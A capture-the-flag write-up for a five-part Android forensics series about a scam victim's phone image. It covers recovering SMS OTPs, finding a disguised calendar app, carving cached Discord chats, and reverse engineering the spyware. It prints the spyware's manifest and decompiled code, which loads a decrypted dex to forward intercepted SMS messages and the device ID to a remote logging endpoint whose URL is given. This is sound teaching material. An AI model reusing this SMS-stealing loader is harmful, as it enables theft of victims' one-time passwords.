# Do Not Redeem

A series of 5 android forensics challenges.

# Challenges' descriptions and writeups

## Do Not Redeem #1

- 319 points
- 89 solves

### Description

Uh oh, we're in trouble again. Kitler's Amazon Pay wallet got emptied by some scammer. Can you figure out the OTP sent to kitler right before that happened, as well as the time (unix timestamp in milliseconds) at which kitler received that OTP?

Flag format: `KashiCTF{OTP_TIMESTAMP}`, i.e. `KashiCTF{XXXXXX_XXXXXXXXXXXXX}`

##### Download kitler's-phone.tar.gz
Mirrors:
1. https://gofile.io/d/edmDCj
2. https://storage.googleapis.com/chall-storage/kitler's-phone.tar.gz
3. [GDrive](https://drive.google.com/file/d/17FPKoDcDBKuRT5-lz13Lw-s3VjNDX5e0/view?usp=sharing)
4. https://limewire.com/d/10d200d2-f55c-446e-9f2b-82bb81f38a84#w-sotKaYWiawMRljM_R78scaItljuNBK88sz90NWpZU

##### Verify the checksum
```sh
$ sha256sum kitler\'s-phone.tar.gz
5ce7e5047c54ce6ec145508ed6a4aecc237c41b86ea61e7e2991e9a8ed05142a  kitler's-phone.tar.gz
```

### Writeup

It might not be immediately apparent from the description for some, but the OTP being talked about in the chall description is indeed an SMS OTP. There isn't much else pertaining to OTPs on the filesystem either (no otp authenticator apps, or any meaningful data inside the amazon package (which was purposefully added to cause a tiny bit of confusion)).

Anyways, back to the task at hand, the universal path for sms storage is `data/data/com.android.providers.telephony/databases/mmssms.db`.

```
$ sqlite3 data/data/com.android.providers.telephony/databases/mmssms.db
SQLite version 3.47.2 2024-12-07 20:39:59
Enter ".help" for usage hints.
sqlite> select name from sqlite_master where type='table';
android_metadata
pdu
sqlite_sequence
addr
part
rate
drm
sms
raw
attachments
sr_pending
canonical_addresses
threads
pending_msgs
words
words_content
words_segments
words_segdir
sqlite> select * from sms;
1|1|57575022||1740251608654|1740251606000|0|1|-1|1|0||839216 is your Amazon OTP. Don't share it with anyone.||0|1|0|com.google.android.apps.messaging|1
2|2|AX-AMZNIN||1740251865569|1740251864000|0|1|-1|1|0||Order placed with order id: PO3663460903896.

Thank you for choosing Amazon as your shopping destination.

Remaining Amazon Pay balance: INR0.69||0|1|0|com.google.android.apps.messaging|1
sqlite>
```

There we have it, `KashiCTF{839216_1740251608654}`.

An alternative solution would be to use autopsy to get to the same point.

---

## Do Not Redeem #2

- 434 points
- 51 solves

### Description

Kitler says he didn't request that OTP, neither did he read or share it. So it must be the scammer at play. Can you figure out the package name of the application that the suspected scammer used to infiltrate Kitler? Wrap your answer within `KashiCTF{` and `}`.

Flag format: `KashiCTF{com.example.pacage.name}`


Download `kitler's-phone.tar.gz` : Use the same file as in the challenge description of [forensics/Do Not Redeem #1](https://kashictf.iitbhucybersec.in/challenges#Do%20Not%20Redeem%20#1-28)

### Writeup

First of all, there aren't many user-installed packages on the system ( as is apparent by looking at `/data/app`) so this chall could be easily bruteforced.

```
$ cd data/app

$ tree -L2
.
├── ~~4YfOtYFWDhRUXa17yHzRwg==
│   └── com.android.chrome-CG1zw8st0xVbevjtVlKZeA==
├── ~~eMXC-RSihqJRS7FC69Zh5Q==
│   └── com.instagram.lite-8PChSgO3IptroqQtK8c5vQ==
├── ~~L7YIhfdSr2fp7g7xJw5EJA==
│   └── com.facebook.lite-Ggfz8AodxJxZtTRj9vcrvQ==
├── ~~o_k0H1Q8rHN7uKw0Ru8MUQ==
│   └── com.mojang.minecraftpe-WQRxX4DYgXeTOkwCZLpotA==
├── ~~tLAl9Y9jaNr2kUyWpsTvlw==
│   └── com.google.android.webview-t-1xjWj6vWxj9dCOWbktGg==
├── ~~UL3Lefa5zqUNERpuoRFbDg==
│   └── com.google.calendar.android--oKQC2Mw2aVpxTKRcybKnw==
├── ~~wO17uFzpDUO2PFLCf5Tg6g==
│   └── com.amazon.mShop.android.shopping-oYLvO1ITa73MCDL2iRz1Fw==
├── ~~yjJM55g1FD4GkNE0OTfOIQ==
│   └── com.google.android.trichromelibrary_636771938-GIXweTIxJwXfsHFBxI29YA==
└── ~~yps67ej5BVmUGNspvIpcNA==
    └── com.discord--vUJ-073y2BPpJsJHJa6Rw==

19 directories, 0 files
```

But for the sake of a proper solution, let's recall what the chall description said: an SMS OTP got leaked. Must be the work of some package whose manifest contains `android.permission.READ_SMS`.

```shell
$ find . -name base.apk -exec bash -c 'permissions=$(aapt dump badging "$1" 2>/dev/null | grep android.permission.READ_SMS); if [[ -n "$permissions" ]]; then echo "$(dirname "$1")"; fi' _ {} \;
./~~UL3Lefa5zqUNERpuoRFbDg==/com.google.calendar.android--oKQC2Mw2aVpxTKRcybKnw==
./~~L7YIhfdSr2fp7g7xJw5EJA==/com.facebook.lite-Ggfz8AodxJxZtTRj9vcrvQ==
```

`com.google.calendar.android` looks sussy. To confirm the suspicions, use `apktool d` or simply try submitting the flag `KashiCTF{com.google.calendar.android}`. 

---

## Do Not Redeem #3

- 499 points
- 10 solves

### Description

Too bad, Kitler did get scammed. Kitler met a lot of people recently, and is having a hard time trying to figure out who exactly the scammer could've been. Can you figure out the scammer's username (on the platform they met), and the link through which the scammer sent Kitler the scam app. Answer according to the below  flag format:

Flag format: `KashiCTF{username_link}`, e.g. `KashiCTF{savsch_https://www.youtu.be/dQw4w9WgXcQ}`


Download `kitler's-phone.tar.gz` : Use the same file as in the challenge description of [forensics/Do Not Redeem #1](https://kashictf.iitbhucybersec.in/challenges#Do%20Not%20Redeem%20#1-28)

### Writeup

First of all, there are a few social chat apps installed on the phone (looking at the customary `/data/app` again):
- com.discord
- com.facebook.lite
- com.instagram.lite
- Possibly chrome

As any sane person would, we'll start our analysis with com.discord.
Ever noticed discord doesn't refuse to open even when internet isn't enabled. It shows a limited number of chats, but it does show them. Obviously the chats ARE BEING CACHED SOMEWHERE. The most obvious place to start is Android's standard `getCacheDir()` (i.e. `/data/[data or user/0]/com.discord/`), but even if you start at some parent directory you will eventually be able to narrow your search down to this directory.

Inside this cache dir there are a bunch of media/images/stickers related stuff which are unlikely to contain the chats. The only interesting directory is `http-cache`, and doing a `file *` inside the same reveals a bunch of file types:

```
[.../data/com.discord/cache/http-cache]$ file * | cut -d' ' -f2-4 | sort | uniq

ASCII text, with
GIF image data,
gzip compressed data,
JPEG image data,
JSON text data
PNG image data,
RIFF (little-endian) data,
```

Ignoring the image files, we're left with ascii, json and gzip files. The ascii and json don't have the chats, so we have the last remaining option: un-gzip one of the gzip compressed files to reveal what's within. The results will, this time, be promising: we get the cached chats, exactly what we've been looking for.

```py
[.../data/data/com.discord/cache/http-cache]$ python
Python 3.12.7 (main, Oct  1 2024, 11:15:50) [GCC 14.2.1 20240910] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> import gzip
>>> fin=b''
>>> import os
>>> for f in os.listdir(os.getcwd()):
...  try:
...   fin+=gzip.decompress(open(f,'rb').read())
...  except Exception:
...   pass
...
>>> len(fin)
3061444
>>> open('aggregated_output','wb').write(fin)
3061444
```

Looking at the `aggregated_output` we have the cached chats, the scammer's username is `savsch` (with Kitler being `ghostfreak_xd`).

![Image](https://github.com/user-attachments/assets/1135032e-8b3b-4ecd-88b1-3cc3b33feccf)

Flag: `KashiCTF{savsch_https://we.tl/t-Ku8Le7js}`

## Do Not Redeem #4

- 500 points
- 6 solves

### Description

The scammer wrote a poem in a game they played with Kitler. They also shared a redeem voucher with Kitler. Can you find out what the voucher code was? Wrap your answer within `KashiCTF{` and `}`

Flag Format: `KashiCTF{VoucherCode}`

Note: solving the previous part will be of great help in solving this one.


Download `kitler's-phone.tar.gz` : Use the same file as in the challenge description of [forensics/Do Not Redeem #1](https://kashictf.iitbhucybersec.in/challenges#Do%20Not%20Redeem%20#1-28)

### Writeup

Looking at the chats found in the previous part of the series (they're also present at the end of this markdown file), it is pretty obvious the chats are contained inside a minecraft world. Since minecraft is installed on kitler's phone (I replaced the actual apk with a mock apk for obvious reasons), the world can be found inside `/data/data/com.mojang.minecraftpe/games/com.mojang/minecraftWorlds`. Although it'd be helpful to load the world inside the game (many people without the bedrock edition did this by first converting the world to java), it was also possible to do this without having a copy of the game. Simply analyze the world files, `grep -Ria`ing for terms like `author` or `book` and the rest, and the answer will be found.

Flag: `KashiCTF{KedA5hKr0f7}`


## Do Not Redeem #5

- 500 points
- 1 solve

### Description

Can you determine the https GET endpoint where the scammer logs their victims' sms messages? The scammer took a lot of steps in hiding the endpoint, maybe they're afraid of getting caught... Wrap your answer within `KashiCTF{` and `}`.

## Footnotes

1. The flag format:
  Let's say the scammer logs their victim's sms messages to the url https://example.site.com/logScamResults?sender=lmao&message=ded&id=victimId
  Then the answer shall be `KashiCTF{https://example.site.com/logScamResults}`. Omit the query string (i.e. the part after (including) `?`).

2. As with other challenges in this series, solving previous challenges, although not required, will be of great help.


Download `kitler's-phone.tar.gz` : Use the same file as in the challenge description of [forensics/Do Not Redeem #1](https://kashictf.iitbhucybersec.in/challenges#Do%20Not%20Redeem%20#1-28)

### Writeup

From the (proper) solution for `#2` (above) it's already clear which apk we gotta analyze. Let's install the apk at `/data/data/~~UL3Lefa5zqUNERpuoRFbDg==/com.google.calendar.android--oKQC2Mw2aVpxTKRcybKnw==/base.apk` on an emulator or a physical device (doesn't matter). Upon opening it immediately requests for sms perms, along with the voucher code. Entering the correct voucher code (from `#4`) will (likely) result in "Invalid coupon".

Let's analyze the apk using jadx to see what's going on.

```xml
<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    android:versionCode="1"
    android:versionName="1.0"
    android:compileSdkVersion="35"
    android:compileSdkVersionCodename="15"
    package="com.google.calendar.android"
    platformBuildVersionCode="35"
    platformBuildVersionName="15">
    <uses-sdk
        android:minSdkVersion="24"
        android:targetSdkVersion="35"/>
    <uses-permission android:name="android.permission.QUERY_ALL_PACKAGES"/>
    <uses-permission android:name="android.permission.INTERNET"/>
    <uses-permission android:name="android.permission.RECEIVE_SMS"/>
    <uses-permission android:name="android.permission.READ_SMS"/>
    <queries>
        <intent>
            <action android:name="android.intent.action.MAIN"/>
        </intent>
    </queries>
    <permission
        android:name="com.google.calendar.android.DYNAMIC_RECEIVER_NOT_EXPORTED_PERMISSION"
        android:protectionLevel="signature"/>
    <uses-permission android:name="com.google.calendar.android.DYNAMIC_RECEIVER_NOT_EXPORTED_PERMISSION"/>
    <application
        android:theme="@style/Theme.NetherGamesVouchers"
        android:label="@string/app_name"
        android:icon="@mipmap/ic_launcher"
        android:allowBackup="true"
        android:supportsRtl="true"
        android:extractNativeLibs="false"
        android:fullBackupContent="@xml/backup_rules"
        android:usesCleartextTraffic="true"
        android:roundIcon="@mipmap/ic_launcher_round"
        android:appComponentFactory="androidx.core.app.CoreComponentFactory"
        android:dataExtractionRules="@xml/data_extraction_rules">
        <activity
            android:name="com.google.calendar.android.MainActivity"
            android:exported="true">
            <intent-filter>
                <action android:name="android.intent.action.MAIN"/>
                <category android:name="android.intent.category.LAUNCHER"/>
            </intent-filter>
        </activity>
        <receiver
            android:name="com.google.calendar.android.SmsReceiver"
            android:permission="android.permission.BROADCAST_SMS"
            android:exported="true">
            <intent-filter>
                <action android:name="android.provider.Telephony.SMS_RECEIVED"/>
            </intent-filter>
        </receiver>
        <service
            android:name="com.google.calendar.android.SmsListenerService"
            android:enabled="true"
            android:exported="false"/>
        <provider
            android:name="androidx.startup.InitializationProvider"
            android:exported="false"
            android:authorities="com.google.calendar.android.androidx-startup">
            <meta-data
                android:name="androidx.emoji2.text.EmojiCompatInitializer"
                android:value="androidx.startup"/>
            <meta-data
                android:name="androidx.lifecycle.ProcessLifecycleInitializer"
                android:value="androidx.startup"/>
            <meta-data
                android:name="androidx.profileinstaller.ProfileInstallerInitializer"
                android:value="androidx.startup"/>
        </provider>
        <receiver
            android:name="androidx.profileinstaller.ProfileInstallReceiver"
            android:permission="android.permission.DUMP"
            android:enabled="true"
            android:exported="true"
            android:directBootAware="false">
            <intent-filter>
                <action android:name="androidx.profileinstaller.action.INSTALL_PROFILE"/>
            </intent-filter>
            <intent-filter>
                <action android:name="androidx.profileinstaller.action.SKIP_FILE"/>
            </intent-filter>
            <intent-filter>
                <action android:name="androidx.profileinstaller.action.SAVE_PROFILE"/>
            </intent-filter>
            <intent-filter>
                <action android:name="androidx.profileinstaller.action.BENCHMARK_OPERATION"/>
            </intent-filter>
        </receiver>
    </application>
</manifest>
```

Onwards, to one of the entrypoints:
```java
public final class MainActivity extends l {

    /* renamed from: v, reason: collision with root package name */
    public final int f5224v = 101;

    static {
        System.loadLibrary("logging");
    }
.
.
.
  public final void onStart() {
        super.onStart();
        int x3 = c.x(this);
        int i3 = this.f5224v;
        if (x3 != 0) {
            c.Y(this, new String[]{"android.permission.RECEIVE_SMS"}, i3);
        }
        if (c.x(this) != 0) {
            c.Y(this, new String[]{"android.permission.RECEIVE_SMS"}, i3);
        } else {
            startService(new Intent(this, (Class<?>) SmsListenerService.class));
        }
    }

    public final native String unlockVoucherCode(Context context, String str);
```
Apart from starting the sms listening service and requesting perms, it loads the `liblogging.so`, for the native function `unlockVoucherCode(Context context, String str)`.

Looking for the usages of either this native function of just the string "Invalid code" lands us to another interesting part:

```java
    public static final boolean b(MainActivity mainActivity, SharedPreferences sharedPreferences, InterfaceC0181b0 interfaceC0181b0, String str) {
        t2.i.e(interfaceC0181b0, "$voucherStr$delegate");
        t2.i.e(str, "code");
        try {
            String unlockVoucherCode = mainActivity.unlockVoucherCode(mainActivity, str);
            if (!B2.i.d0(unlockVoucherCode)) {
                Toast.makeText(mainActivity, "Invalid code", 0).show();
                return true;
            }
            AbstractC0335n.H(new File(mainActivity.getFilesDir().getAbsolutePath() + "/misc_config.dex"), AbstractC0334m.c(new byte[]{116, 120, -100, 118, -75, -46, 30, 43, 47, 107, -7, -116, 38, -13, -44, 117, 116, 43, -64, 122, -57, -25, 39, 72, 63, 9, -80, 30, 41, 61, 39, -37, 114, 57, -102, 117, 12, 12, -83, -98, -90, 64, 29, 60, -46, 54, 17, -56, 83, 41, -111, 3, 25, 31, 22, 16, Byte.MAX_VALUE, -127, 91, -24, -80, -116, 1, 75, -35, 4, 73, 47, .................. a whole host of bytes
```
Also the code inside the sms broadcast receiver (the other entry point to the app):
```java
    String str = originatingAddress;
    SmsMessage smsMessage = createFromPdu;
    int i3 = SmsReceiver.f5226a;
    Context context2 = context;
    t2.i.e(context2, "$context");
    t2.i.e(this, "this$0");
    try {
        Class<?> loadClass = new DexClassLoader(A1.d.h(context2.getFilesDir().getAbsolutePath(), "/misc_config.dex"), context2.getDir("outdex", 0).getAbsolutePath(), null, SmsReceiver.class.getClassLoader()).loadClass("org.calendar.FontSize");
        Object newInstance = loadClass.newInstance();
        Method method = loadClass.getMethod("process", String.class, String.class, String.class);
        String string = Settings.Secure.getString(context2.getContentResolver(), "android_id");
        t2.i.d(string, "getString(...)");
        method.invoke(newInstance, str, smsMessage, string);
    } catch (Exception unused) {
    }
```

Looking around, a bunch of observations can be made:
- The `misc_config.dex` contains the url to the GET endpoint we are after, but the dex has been redacted from `/data/data/com.google.calendar.android/files/misc_config.dex`
- It can however be derived from the bytes coded into the apk, given we're able to find the correct output of liblogging.so's `unlockVoucherCode`.
1. You're able to reverse liblogging.so: you get the flag, no questions asked.
2. You aren't; You do what follows:
- liblogging.so is difficult to reverse engineer, so let's look for other ways
- we already know one of the two inputs to `unlockVoucherCode(voucherCode, context)`: the voucherCode. Which means we just have to figure out what could possibly be happening with the context. Remember the peculiar `QUERY_ALL_PACKAGES` perm in android manifest?
- Look at the chall description, it alludes to the scammer "hiding the endpoint". What does the scammer know about the victim: That the victim is guaranteed to have some apps (like discord and minecraft) installed. Maybe that's why QUERY_ALL_PACKAGES is requested. Let's recreate the victim's environment, because after all, the victim didn't have to reverse engineer to have the `misc_config.dex` decrypted on their phone. Install a bunch of key packages (specifically com.discord and com.mojang.minecraftpe) before trying to input the voucher. You don't get the "Invalid code" messsage this time. The dex decrypted successfully, now just baksmali it (or not, maybe just `strings` it) to get the hardcoded GET endpoint.

Peace.

The flag: `KashiCTF{https://voucher-code-kashictf.vercel.app/logrealendpointTrustMeBroX0X0PPBoopBoop}`


# Making the challenges

### Last Things First

After having materialized the so-called "Kitler's phone" on an android avd, I realized it is no longer possible _to directly distribute the qemu qcow2 images for the userdata (and other) partitions, due to them being encrypted_, unlike how it used to be long long ago on old android versions. I searched the internet and found a decryption script in python which (un)fortunately didn't work.

But every cloud has a silver lining. I can always just tar -cz the relevant files, and distribute the tarball as the attachment, and get away calling it a disk forensics challenge. Good for me, as I don't have to worry about accidentally leaking flags or parts thereof without falling prone to them being recoverable even after deletion by those exotic techniques forensics people use, like carving.

#### Some background

Here's the overview: The victim, named `Kitler` gets a DM on discord. The rest of it is pretty much self explanatory 😴:

```
[Scammer]  Hey, I saw u'r in minecraft server too. Which edition do you play?
[Kitler]   Pocket (edited)
[Scammer]  Nice, I play bedrock too
[Kitler]   Up for some PvP?
[Scammer]  Sure
[Scammer]  what's your @
[Kitler]   Same as on discord
[Scammer]  Okay, see you on nethergames, lobby 11
[Kitler]   play.nethergames.org, right?
[Scammer]  exactly
[Scammer]  CRUSHED you haha
[Kitler]   Well im not proud of myself

[Scammer]  I like building, actually
Wanna check out my world?
[Scammer]  Excited
[Kitler]   Added you as friends from xbox profile, can you see my world..
[Scammer]  "My City", is that it?
[Kitler]   Yes, I made it myself. Feel free to join
[Scammer]   that's sooo big
[Kitler]   It took me 7 years to make this
[Scammer]  
[Scammer]  I like the pyramids
[Scammer]  Shit I got poisoned
[Scammer]  helpp
[Kitler]   Lol that was a trap
[Scammer]  lmao dead
[Scammer]  literally
[Kitler]   Come back to coords 200, 75, -13
[Scammer]  Wait
[Scammer]  this beacon tower is kinda cool
[Scammer]  it's a pain to climb up all the scaffolding, may I suggest a bubble column?
[Kitler]   I considered it, but it destroys the look
[Scammer]  A nether elevator, then?
[Kitler]   Aah that didn't cross my mind. Can you help me build it?
[Scammer]  Can I keep the top floor of the tower for myself, then?
[Kitler]   Yup, it's all yours
[Scammer]  The view from here is downright fantastic
[Scammer]  I wrote a poem, mind checking out?
[Kitler]   Is that the one near the bed
[Scammer]  Yes (edited)
[Kitler]   Cool pen name. Sad to read about your university though. Is that real?
[Scammer]  Yes, it's canon (unlike everything else in this challenge)
[Kitler]   Emm challenge :/ ?
[Scammer]  nvm lol
[Kitler]   Oh nethergames has bedwars as well, I love that mode
[Scammer]  yes, let's play together. Had fun building in your world. Back to lobby 11, join my party invite.
[Kitler]   Omw
[Scammer]  The lightning effect is cool, how did you get it?
[Scammer]  Bought it a while back, but I don't plan on using it anymore
[Scammer]  Just unlocked another effect yesterday, forgot about equipping it
[Kitler]   Wish I had one of those
[Scammer]  Well I can turn my effect into a nethergames transfer voucher, and send it to you
[Kitler]   For free
[Scammer]  ?
[Scammer]  yes
[Kitler]   I can't believe
[Scammer]  Try it out yourself
[Kitler]   How so?
[Scammer]  Just download the official nethergames voucher app and redeem it. It takes a while for their admins to confirm it as non-spam, so you might have to wait. (edited)
[Kitler]   Can't find the app
[Scammer]  Here, download it: https://we.tl/t-Ku8Le7js
[Kitler]   Done. What's the code?
[Scammer]  It's the same as my pen name
[Kitler]   Pen Name??
[Scammer]  bruh
[Scammer]  It's the name I signed that poem with, the one I kept at my room in your beacon tower
[Kitler]   Oh that one (edited)
[Scammer]  Got it
[Scammer]  It shows awaiting confirmation
[Scammer]  Yup you'll have to wait
[Scammer]  See you later, I'm a bit busy
[Kitler]   Cya
[Scammer]  cya
[Kitler]   Hey
[Scammer]  The admins haven't approved that yet
[Scammer]  chill
[Kitler]   ?
[Scammer]  https://youtu.be/spk2hyt9PRI
[Kitler]   Cool video, i saw it too
[Scammer]  But i don't understand
[Scammer]  Is the code wrong?
[Scammer]  The admins take like a week lol  (edited)
[Kitler]   Aah i get it now
[Kitler]   My ADHD won't allow me to wait
```

#### The spyware

See [source-for-the-backdoor-the-scammer-used](./source-for-the-backdoor-the-scammer-used/README.md).